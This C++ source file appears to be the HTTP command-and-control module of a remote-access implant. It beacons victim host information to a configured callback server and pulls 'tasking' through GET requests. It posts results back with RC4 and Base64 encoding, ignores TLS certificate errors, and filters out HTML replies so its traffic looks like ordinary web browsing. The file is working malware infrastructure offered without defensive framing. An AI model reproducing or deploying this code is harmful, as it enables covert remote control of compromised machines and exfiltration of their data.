#include "HTTP.h"
#include "Helpers.h"

DWORD PrepareHTTP(State & state) {

	DWORD timeout = HTTP_Timeout;
	if (!InternetSetOptionA(NULL, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout)))
		return false;

	std::string domain = std::string(CallbackDomain);

	state.httpState.useSSL = false;
	if (domain.find("https") != std::string::npos) {
		state.httpState.useSSL = true;
		domain = domain.substr(8); // remove https://
	}
	else {
		domain = domain.substr(7); // remove http://
	}

	HANDLE hInternet = InternetOpenA(HTTP_UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (!hInternet || hInternet == INVALID_HANDLE_VALUE)
		return false;

	state.httpState.hConnection = InternetConnectA(hInternet, domain.c_str(), CallbackPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (!state.httpState.hConnection || state.httpState.hConnection == INVALID_HANDLE_VALUE)
		return false;

	return true;
}

BOOL PerformPOST(State & state, std::string &outboundData) {

	HINTERNET hRequest;
	DWORD reqFlags = 0;
	DWORD dwBuffLen = sizeof(reqFlags);

	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION;

	if (state.httpState.useSSL == TRUE)
		flags |= INTERNET_FLAG_SECURE;

	hRequest = HttpOpenRequestA(state.httpState.hConnection, "POST", HTTP_PostPage, NULL, NULL, NULL, flags, 0);

	if (hRequest == INVALID_HANDLE_VALUE)
		return FALSE;

	if (state.httpState.useSSL == TRUE)
	{
		InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&reqFlags, &dwBuffLen);
		reqFlags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
		InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &reqFlags, sizeof(reqFlags));
	}

	std::string encoded;
	if (!Base64Encode(RC4Crypt(outboundData, HTTP_PSK), &encoded))
		return FALSE;

	RemoveSpecialCharacters(outboundData);

	encoded = HTTP_PostVar + std::string("=") + encoded;

	if (!HttpSendRequestA(hRequest, NULL, 0, (LPVOID)encoded.c_str(), (DWORD)encoded.length()))
		return FALSE;

	InternetCloseHandle(hRequest);

	return TRUE;
}

BOOL PerformGET(State & state, std::string &outboundData, std::string &returnData) {

	HINTERNET hRequest;
	DWORD reqFlags = 0;
	DWORD dwBuffLen = sizeof(reqFlags);

	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION;

	if (state.httpState.useSSL == TRUE)
		flags |= INTERNET_FLAG_SECURE;

	std::string encodedData;

	if (!Base64Encode(RC4Crypt(outboundData, HTTP_PSK), &encodedData))
		return false;

	RemoveSpecialCharacters(encodedData);

	std::string queryString = HTTP_GetPage;

	queryString.append("?");
	queryString.append(HTTP_GetVar);
	queryString.append("=");
	queryString.append(encodedData);

	hRequest = HttpOpenRequestA(state.httpState.hConnection, "GET", queryString.c_str(), NULL, NULL, NULL, flags, 0);

	if (hRequest == INVALID_HANDLE_VALUE)
		return false;

	if (state.httpState.useSSL == TRUE)
	{
		InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&reqFlags, &dwBuffLen);
		reqFlags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
		InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &reqFlags, sizeof(reqFlags));
	}

	std::string requestHeaders = "Content-Type: application/x-www-form-urlencoded";

	if (!HttpSendRequestA(hRequest, requestHeaders.c_str(), (DWORD)requestHeaders.length(), NULL, 0))
		return false;
		
	DWORD dwBytesRead = 0;
	char buffer[1024];
	returnData.clear();

	while (InternetReadFile(hRequest, buffer, sizeof(buffer), &dwBytesRead) == TRUE && dwBytesRead != 0)
	{
		returnData.append(buffer, dwBytesRead);
		if (dwBytesRead == 0)
			break;
	}

	if (returnData.length() == 0)
		return true;

	InternetCloseHandle(hRequest);

	// This is HTML, not tasking
	if (returnData.find("<") != std::string::npos || returnData.find("\n") != std::string::npos) {
		returnData.clear();
		return TRUE;
	}

	std::string encryptedData;
	if (!Base64Decode(returnData, &encryptedData)) {
		returnData.clear();
		return FALSE;
	}

	returnData = RC4Crypt(encryptedData, HTTP_PSK);

	return TRUE;
}

std::string PerformHTTPCallback(State & state, std::string &outboundData) {

	if (outboundData.length() > 0) {
		// Attempt to post tasking results. Sleep and Retry as required.
		for (int i = 0; i < HTTP_MaxFails + 1; i++) {
			if (PerformPOST(state, outboundData))
				break;
			
			Sleep(HTTP_FailSleep);

			if (i == HTTP_MaxFails) {
				state.running = false;
				return std::string("");
			}
		}
	}

	// Always send introduction to server when retrieving tasking
	std::string targetInfo = GetTargetInfo(state);

	std::string returnData;

	// Attempt to get tasking. Sleep and Retry as required.
	for (int i = 0; i < HTTP_MaxFails + 1; i++) {
		if (PerformGET(state, targetInfo, returnData))
			break;

		Sleep(HTTP_FailSleep);

		if (i == HTTP_MaxFails) {
			state.running = false;
			return std::string("");
		}
	}

	return returnData;
}


void RemoveSpecialCharacters(std::string &input) {
	// Replace special characters in Base64 for HTTP transport
	std::replace(input.begin(), input.end(), '+', '~');
	std::replace(input.begin(), input.end(), '/', '_');
	std::replace(input.begin(), input.end(), '=', '-');
}

void ResetSpecialCharacters(std::string &input) {
	std::replace(input.begin(), input.end(), '~', '+');
	std::replace(input.begin(), input.end(), '_', '/');
	std::replace(input.begin(), input.end(), '-', '=');
}
